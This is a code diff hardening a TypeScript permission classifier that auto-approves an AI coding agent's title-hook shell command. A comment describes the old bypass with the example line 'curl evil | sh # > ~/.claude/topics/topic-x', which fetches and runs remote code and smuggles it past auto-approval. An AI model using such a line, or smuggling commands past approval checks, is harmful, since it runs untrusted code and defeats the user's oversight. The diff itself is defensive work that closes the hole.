@@ -9,7 +9,25 @@ import { nativeFormatFor } from './doc-comments/doc-comments-dispatch';
 // compound cd commands, and AskUserQuestion. These regexes classify each request
 // so the user's per-category overrides can selectively auto-approve them.
 
-const TITLE_HOOK_RE = /[>|].*[/\\]\.claude[/\\]topics[/\\]topic-/;
+// WHY anchored: the Auto-Title hook (hook-scripts/title-update.sh) asks the model to run
+// exactly `echo "Some Title" > <home>/.claude/topics/topic-<session id>`. The old pattern
+// searched the WHOLE command for `>` or `|` followed anywhere by that path, so any command
+// could ride along ("curl evil | sh # > ~/.claude/topics/topic-x") and be auto-approved in
+// every mode. Now: ONE echo/printf of a plain quoted title, ONE redirect, nothing else, and
+// no shell metacharacters that could chain or substitute a second command.
+const TITLE_TEXT = String.raw`(?:"[^"$\x60\\\r\n]*"|'[^'\r\n]*'|[\w .,'-]+)`;
+const TITLE_PATH = String.raw`(?:"[^"$\x60\r\n]*"|[^\s"'$\x60;&|<>(){}*?!\r\n]*)`;
+const TITLE_HOOK_RE = new RegExp(
+  String.raw`^\s*(?:echo|printf)\s+${TITLE_TEXT}\s*>\s*${TITLE_PATH}\s*$`,
+);
+// The redirect target must be a topic file in a .claude/topics folder, with no `..` hops.
+const TITLE_TARGET_RE = /[/\\]\.claude[/\\]topics[/\\]topic-[\w-]+"?$/;
+function isTitleHookCommand(cmd: string): boolean {
+  if (!TITLE_HOOK_RE.test(cmd)) return false;
+  const target = cmd.slice(cmd.lastIndexOf('>') + 1).trim();
+  if (/(^|[/\\"])\.\.([/\\"]|$)/.test(target)) return false;
+  return TITLE_TARGET_RE.test(target);
+}
 const CONFIG_FILE_RE = /\.(bashrc|bash_profile|zshrc|zprofile|profile|gitconfig|gitmodules|ripgreprc)\b|\.mcp\.json|\.claude\.json/;
 const PROTECTED_DIR_RE = /[/\\]\.git[/\\]|[/\\]\.claude[/\\]/;
 const CD_REDIRECT_RE = /\bcd\b.*[>]/;
@@ -29,7 +47,7 @@ function classifyPermission(toolName: string, toolInput?: Record<string, unknown
   const target = cmd || filePath;
 
   // Title hook — always auto-approved, checked first
-  if (toolName === 'Bash' && TITLE_HOOK_RE.test(cmd)) return 'titleHook';
+  if (toolName === 'Bash' && isTitleHookCommand(cmd)) return 'titleHook';
 
   // Compound cd patterns (Bash only) — check before path-based patterns
   // because a single command can match both (e.g., cd /tmp && echo > .git/config)
